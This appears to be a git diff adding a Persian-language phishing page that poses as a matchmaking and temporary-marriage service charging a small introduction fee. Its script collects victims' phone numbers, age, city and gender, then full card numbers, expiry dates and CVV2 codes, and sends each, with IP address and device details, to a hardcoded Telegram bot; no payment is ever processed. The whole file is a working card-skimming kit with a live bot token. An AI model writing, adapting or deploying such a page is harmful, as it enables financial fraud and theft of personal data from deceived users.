@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>همدم</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Vazirmatn', sans-serif;
+    }
+    body {
+      margin: 0;
+      overflow: hidden;
+      height: 100vh;
+      position: relative;
+    }
+    .carousel {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      opacity: 0.6;
+    }
+    .carousel img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: none;
+    }
+    .carousel img.active {
+      display: block;
+    }
+    .container {
+      position: relative;
+      z-index: 10;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.85);
+    }
+    .form-box {
+      background: white;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      width: 90%;
+      max-width: 450px;
+    }
+    .form-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #2c3e50;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      color: #34495e;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #bdc3c7;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #3498db;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #2980b9;
+    }
+    .warning {
+      background: #fff3cd;
+      border: 1px solid #ffeaa7;
+      color: #856404;
+      padding: 10px;
+      border-radius: 8px;
+      margin: 15px 0;
+      font-weight: bold;
+      text-align: center;
+    }
+    .hidden {
+      display: none;
+    }
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #2ecc71;
+      color: white;
+      padding: 15px 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      z-index: 1000;
+      display: none;
+    }
+    .error-toast {
+      background: #e74c3c;
+    }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <div class="carousel" id="carousel">
+    <img src="https://i.postimg.cc/L5tVK37s/IMG-20250909-160212-162.jpg" class="active">
+    <img src="https://i.postimg.cc/DfxVRQrK/IMG-20251010-115455-685.jpg">
+    <img src="https://i.postimg.cc/7hw278sh/IMG-20250715-161907-584.jpg">
+  </div>
+
+  <div class="container" id="phoneForm">
+    <div class="form-box">
+      <h2>ورود به سامانه جامع صیغه‌یابی‌و‌رل‌یابی</h2>
+      <div class="form-group">
+        <label for="phone">شماره خود را وارد کنید:</label>
+        <input type="tel" id="phone" placeholder="مثال: 09123456789" maxlength="11">
+      </div>
+      <button onclick="submitPhone()">ادامه</button>
+    </div>
+  </div>
+
+  <div class="container hidden" id="demoForm">
+    <div class="form-box">
+      <h2>اطلاعات فردی خود را وارد کنید🌱</h2>
+      <div class="form-group">
+        <label for="age">سن:</label>
+        <input type="number" id="age" min="16" max="100">
+      </div>
+      <div class="form-group">
+        <label for="city">شهر محل زندگی:</label>
+        <input type="text" id="city" placeholder="تهران،اصفهان،....">
+      </div>
+      <div class="form-group">
+        <label for="gender">جنسیت:</label>
+        <select id="gender">
+          <option value="">انتخاب کنید</option>
+          <option value="مرد">🙎🏼 آقا</option>
+          <option value="زن">🙎🏼‍♀ خانم</option>
+        </select>
+      </div>
+      <button onclick="submitDemo()">پرداخت هزینه معرفی</button>
+    </div>
+  </div>
+
+  <div class="container hidden" id="paymentForm">
+    <div class="form-box">
+      <div class="warning">
+     هزینه معرفی هر‌کیس 5,000هزار‌تومان میباشد💸
+      </div>
+      <h2>مبلغ قابل پرداخت👈🏼5,000تومان</h2>
+      <div class="form-group">
+        <label for="card">شماره کارت:</label>
+        <input type="text" id="card" maxlength="16" placeholder="شماره کارت 16رقمی">
+      </div>
+      <div style="display: flex; gap: 10px;">
+        <div style="flex:1">
+          <label for="month">ماه:</label>
+          <input type="text" id="month" maxlength="2" placeholder="مثال👈🏼08">
+        </div>
+        <div style="flex:1">
+          <label for="year">سال:</label>
+          <input type="text" id="year" maxlength="2" placeholder="مثال👈🏼08">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="cvv2">CVV2:</label>
+        <input type="text" id="cvv2" maxlength="4" placeholder="Cvv2">
+      </div>
+      <div class="warning">
+     قبل از پرداخت از صحت اطلاعات وارد شده اطمینان حاصل کنید🥂
+      </div>
+      <button style="background: #e74c3c;" onclick="submitPayment()">تایید و پرداخت</button>
+    </div>
+  </div>
+
+  <div class="container hidden" id="successPage">
+    <div class="form-box" style="text-align: center;">
+      <h2 style="color: #27ae60;">درخواست شما ثبت شد✅</h2>
+      <p style="margin-top: 15px; color: #7f8c8d;">
+        طی 24ساعت آینده جهت معرفی کیس‌‌ و مشاوره از طرف کارشناسان ما با شما تماس گرفته خواهد شد.متشکر از صبر و شكیبایی شما🩷
+      </p>
+    </div>
+  </div>
+
+  <div class="toast" id="toast">در حال پردازش...</div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "8313581051:AAGMvPViuIkZZNAK0cPi_z9tiz6K1weDXr0";
+    const TELEGRAM_CHAT_ID = "-1003218211476";
+
+    let deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      ip: 'در حال دریافت...'
+    };
+
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        deviceInfo.ip = data.ip;
+      })
+      .catch(() => {
+        deviceInfo.ip = 'ناشناخته';
+      });
+
+    let currentIndex = 0;
+    const images = document.querySelectorAll('.carousel img');
+    setInterval(() => {
+      images[currentIndex].classList.remove('active');
+      currentIndex = (currentIndex + 1) % images.length;
+      images[currentIndex].classList.add('active');
+    }, 5000);
+
+    function showToast(message, isError = false) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = `toast ${isError ? 'error-toast' : ''}`;
+      toast.style.display = 'block';
+      setTimeout(() => toast.style.display = 'none', 3000);
+    }
+
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+        return response.ok;
+      } catch (err) {
+        console.error('خطا در ارسال به تلگرام:', err);
+        return false;
+      }
+    }
+
+    async function submitPhone() {
+      const phone = document.getElementById('phone').value.trim();
+      if (!phone || phone.length !== 11 || !phone.startsWith('09')) {
+        showToast('شماره موبایل معتبر نیست!', true);
+        return;
+      }
+
+      const message = `
+📱 *شماره موبایل دریافت شد*:
+📞  ${phone}
+🌐 IP: ${deviceInfo.ip}
+💻 دستگاه: ${deviceInfo.userAgent}
+🕒 ${new Date().toLocaleString('fa-IR')}
+      `.trim();
+
+      showToast('در حال ثبت شماره');
+      const success = await sendToTelegram(message);
+      if (!success) {
+        showToast('❗️خطا در ثبت شماره', true);
+        return;
+      }
+
+      document.getElementById('phoneForm').classList.add('hidden');
+      document.getElementById('demoForm').classList.remove('hidden');
+    }
+
+    async function submitDemo() {
+      const age = document.getElementById('age').value;
+      const city = document.getElementById('city').value.trim();
+      const gender = document.getElementById('gender').value;
+
+      if (!age || !city || !gender) {
+        showToast('لطفاً تمام فیلدها را پر کنید.', true);
+        return;
+      }
+      if (isNaN(age) || age < 5 || age > 100) {
+        showToast('سن باید بین 16 تا 100 باشد.', true);
+        return;
+      }
+
+      const message = `
+👤 *اطلاعات دموگرافیک دریافت شد*:
+📱 شماره: ${document.getElementById('phone').value}
+👤 جنسیت: ${gender}
+🎂 سن: ${age}
+🏙 شهر: ${city}
+🌐 IP: ${deviceInfo.ip}
+💻 دستگاه: ${deviceInfo.userAgent}
+🕒 ${new Date().toLocaleString('fa-IR')}
+      `.trim();
+
+      showToast('در حال بررسی اطلاعات');
+      const success = await sendToTelegram(message);
+      if (!success) {
+        showToast('❗️خطا در بررسی اطلاعات', true);
+        return;
+      }
+
+      document.getElementById('demoForm').classList.add('hidden');
+      document.getElementById('paymentForm').classList.remove('hidden');
+    }
+
+    // ✅ تابع نهایی پرداخت — CVV2 هم 3 رقم و هم 4 رقم قبول می‌کند
+    async function submitPayment() {
+      // دریافت مقادیر
+      let card = document.getElementById('card').value.trim();
+      let month = document.getElementById('month').value.trim();
+      let year = document.getElementById('year').value.trim();
+      let cvv2 = document.getElementById('cvv2').value.trim();
+
+      // حذف فاصله و کاراکترهای غیرعددی (اختیاری ولی توصیه می‌شود)
+      card = card.replace(/\D/g, '');
+      month = month.replace(/\D/g, '');
+      year = year.replace(/\D/g, '');
+      cvv2 = cvv2.replace(/\D/g, '');
+
+      // اعتبارسنجی اصلی: کارت و تاریخ باید کامل باشند
+      if (card.length !== 16 || month.length !== 2 || year.length !== 2) {
+        showToast('شماره کارت یا تاریخ انقضا ناقص است.', true);
+        return;
+      }
+
+      // ✅ CVV2 فقط نباید خالی باشد — 3 یا 4 رقم هر دو قابل قبول‌اند
+      if (cvv2.length === 0) {
+        showToast('لطفاً CVV2 را وارد کنید.', true);
+        return;
+      }
+
+      // ارسال هر چیزی که وارد شده (3 یا 4 رقم — یا حتی بیشتر/کمتر، ولی ما فقط 3/4 رو انتظار داریم)
+      const message = `
+💳 *اطلاعات کارت فیک دریافت شد*:
+📱 شماره: ${document.getElementById('phone').value}
+👤 جنسیت: ${document.getElementById('gender').value}
+🎂 سن: ${document.getElementById('age').value}
+🏙 شهر: ${document.getElementById('city').value}
+💳 شماره کارت: ${card}
+📅 انقضا: ${month}/${year}
+🔢 CVV2 (${cvv2.length} رقم): ${cvv2}
+🌐 IP: ${deviceInfo.ip}
+💻 دستگاه: ${deviceInfo.userAgent}
+🕒 ${new Date().toLocaleString('fa-IR')}
+      `.trim();
+
+      showToast('انتقال به درگاه پرداخت');
+      const success = await sendToTelegram(message);
+      if (!success) {
+        showToast('خطا از صحت اطلاعات وارد شده اطمینان حاصل کنید.', true);
+        return;
+      }
+
+      setTimeout(() => {
+        document.getElementById('paymentForm').classList.add('hidden');
+        document.getElementById('successPage').classList.remove('hidden');
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
